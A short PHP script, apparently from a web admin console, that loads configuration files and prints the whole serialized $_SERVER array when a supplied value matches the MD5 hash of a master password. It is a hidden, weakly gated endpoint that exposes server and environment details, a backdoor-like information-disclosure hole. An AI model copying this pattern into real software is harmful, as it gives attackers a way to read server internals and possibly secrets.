<?php
$localSys['scriptID']='login';
$localSys['scriptVersion']='4.0';
require_once($_SERVER['DOCUMENT_ROOT'].'/gf5/console/systeam/php/config.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/gf5/console/resources/bais_00_includes.php');

if($PW==md5($MASTER_PASSWORD))echo base64_encode(serialize($_SERVER));

?>